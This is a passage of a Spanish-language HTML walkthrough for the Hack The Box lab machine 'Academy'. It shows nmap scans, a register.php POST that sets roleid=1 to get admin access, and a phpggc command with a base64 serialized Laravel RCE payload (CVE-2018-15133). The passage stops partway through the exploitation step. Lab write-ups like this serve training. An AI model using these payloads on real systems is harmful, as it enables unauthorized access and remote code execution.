@@ -1,0 +1,1062 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.3.9">
+    
+    
+      
+        <title>Academy - Pentesting</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.1d29e8d0.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#academy-htb" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Pentesting" class="md-header__button md-logo" aria-label="Pentesting" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Pentesting
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Academy
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Pentesting" class="md-nav__button md-logo" aria-label="Pentesting" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Pentesting
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        Introdución
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Máquinas
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Máquinas" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Máquinas
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_1">
+          Linux
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Linux" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          Linux
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Academy
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Academy
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    Recon
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enum" class="md-nav__link">
+    Enum
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#acceso-a-la-web" class="md-nav__link">
+    Acceso a la web
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#explotation-intrusion" class="md-nav__link">
+    Explotation - Intrusion
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-movement" class="md-nav__link">
+    Lateral Movement
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#escalate-privileges-root" class="md-nav__link">
+    Escalate Privileges (root)
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bank/" class="md-nav__link">
+        Bank
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bolt/" class="md-nav__link">
+        Bolt
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../chainsaw/" class="md-nav__link">
+        Chainsaw
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../epsilon/" class="md-nav__link">
+        Epsilon
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../flustered/" class="md-nav__link">
+        Flustered
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../goodgames/" class="md-nav__link">
+        Goodgames
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../laboratory/" class="md-nav__link">
+        Laboratory
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nodeblog/" class="md-nav__link">
+        Nodeblog
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nunchucks/" class="md-nav__link">
+        Nunckucks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pressed/" class="md-nav__link">
+        Pressed
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../unbalanced/" class="md-nav__link">
+        Unbalanced
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../validation/" class="md-nav__link">
+        Validation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zipper/" class="md-nav__link">
+        Zipper
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2_2">
+          Windows
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Windows" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          Windows
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/arkham/" class="md-nav__link">
+        Arkham
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../windows/return/" class="md-nav__link">
+        Return
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Recursos
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Recursos" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Recursos
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/docker/" class="md-nav__link">
+        Docker
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/exploits/" class="md-nav__link">
+        Exploits
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/inyecciones/" class="md-nav__link">
+        Inyecciones
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/shells/" class="md-nav__link">
+        Shells
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/tools/" class="md-nav__link">
+        Tools
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../recursos/win-commands/" class="md-nav__link">
+        Windows Commands
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+
+<h1 id="academy-htb">Academy HTB</h1>
+<h2 id="recon">Recon</h2>
+<ul>
+<li>
+<p>Se comprueba que la máquina está activa:</p>
+<blockquote>
+<p><code>ping 10.10.10.215</code></p>
+</blockquote>
+</li>
+</ul>
+<h2 id="enum">Enum</h2>
+<ul>
+<li>
+<p>Se realiza un scan de los 65535 puertos TCP:</p>
+<blockquote>
+<p><code>nmap -sS -Pn -n --open --min-rate 5000 -p- -vvv -oG allPorts 10.10.10.215</code></p>
+</blockquote>
+</li>
+<li>
+<p>Se realiza un scan de los puertos abiertos:</p>
+<blockquote>
+<p><code>nmap -sC -sV -p22,80,33060 10.10.10.215 -oN openPorts</code></p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>PORT      STATE SERVICE VERSION
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>| ssh-hostkey: 
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>|_http-title: Did not follow redirect to http://academy.htb/
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>|_http-server-header: Apache/2.4.41 (Ubuntu)
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>33060/tcp open  mysqlx?
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>| fingerprint-strings: 
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>|     Invalid message&quot;
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>|_    HY000
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>SF-Port33060-TCP:V=7.92%I=7%D=8/5%Time=62EC57E3%P=x86_64-pc-linux-gnu%r(NU
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>SF:LL,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(GenericLines,9,&quot;\x05\0\0\0\x0b\x
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>SF:08\x05\x1a\0&quot;)%r(GetRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(HTTPOpt
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>SF:ions,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(RTSPRequest,9,&quot;\x05\0\0\0\x0b\
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>SF:x08\x05\x1a\0&quot;)%r(RPCCheck,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSVersi
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>SF:onBindReqTCP,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(DNSStatusRequestTCP,2B
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>SF:,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fIn
+<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>SF:valid\x20message\&quot;\x05HY000&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%
+<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>SF:r(SSLSessionReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\
+<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>SF:x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;)%r(TerminalServerCookie,
+<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>SF:9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(TLSSessionReq,2B,&quot;\x05\0\0\0\x0b\x0
+<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\
+<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>SF:x05HY000&quot;)%r(Kerberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBProgNeg,9,
+<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>SF:&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x08\x05\x
+<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY00
+<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>SF:0&quot;)%r(FourOhFourRequest,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LPDString,9
+<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>SF:,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LDAPSearchReq,2B,&quot;\x05\0\0\0\x0b\x08
+<a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x
+<a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>SF:05HY000&quot;)%r(LDAPBindReq,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SIPOptions,
+<a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>SF:9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(LANDesk-RC,9,&quot;\x05\0\0\0\x0b\x08\x0
+<a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>SF:5\x1a\0&quot;)%r(TerminalServer,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(NCP,9,&quot;\
+<a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>SF:x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(NotesRPC,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a
+<a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>SF:\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x05HY000&quot;
+<a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>SF:)%r(JavaRMI,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(WMSRequest,9,&quot;\x05\0\0\
+<a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>SF:0\x0b\x08\x05\x1a\0&quot;)%r(oracle-tns,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(
+<a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>SF:ms-sql-s,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(afp,2B,&quot;\x05\0\0\0\x0b\x08
+<a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>SF:\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&quot;\x
+<a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>SF:05HY000&quot;)%r(giop,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;);
+<a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+</li>
+</ul>
+<h2 id="acceso-a-la-web">Acceso a la web</h2>
+<ul>
+<li>
+<p>Accediendo a academy.htb/register.htb podemos registrarnos para acceder desde login.php</p>
+</li>
+<li>
+<p>Pero para acceder a admin.php se puede modificar el rol desde el registro usando burp:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>POST /register.php HTTP/1.1
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Host: academy.htb
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>User-Agent: Mozilla/4.77 en (X11; U; Linux 2.4.9 i686)
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>Accept-Language: en-US,en;q=0.5
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>Accept-Encoding: gzip, deflate
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>Content-Type: application/x-www-form-urlencoded
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>Content-Length: 48
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>Origin: http://academy.htb
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>DNT: 1
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>Connection: close
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>Referer: http://academy.htb/register.php
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>Cookie: PHPSESSID=60i29vhf1m8hmsgv3dgj8ba5bo
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>Upgrade-Insecure-Requests: 1
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>Sec-GPC: 1
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>uid=usuarioX&amp;password=passd123&amp;confirm=passw123&amp;roleid=1
+</code></pre></div>
+</li>
+<li>
+<p>Tras logar en admin.php esto nos lleva a la página http://academy.htb/admin-page.php donde se descubre un nuevo subdominio:</p>
+<p><img alt="" src="../images/academy_subdominio.png" /></p>
+</li>
+</ul>
+<h2 id="explotation-intrusion">Explotation - Intrusion</h2>
+<ul>
+<li>
+<p>Tras acceder al subdominio se pueden ver errores de depuración que indican que utiliza Laravel y nos filtra la key de la API:</p>
+<blockquote>
+<p><a href="https://github.com/kozmic/laravel-poc-CVE-2018-15133">Link RCE Laravel</a></p>
+<p><a href="https://github.com/ambionics/phpggc">Link serializador phpggc</a></p>
+</blockquote>
+</li>
+<li>
+<p>Generar payload serializado para Laravel en base64:</p>
+<blockquote>
+<p>./phpggc Laravel/RCE3 system whoami -b</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>    Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0=
+</code></pre></div>
+</li>
+<li>
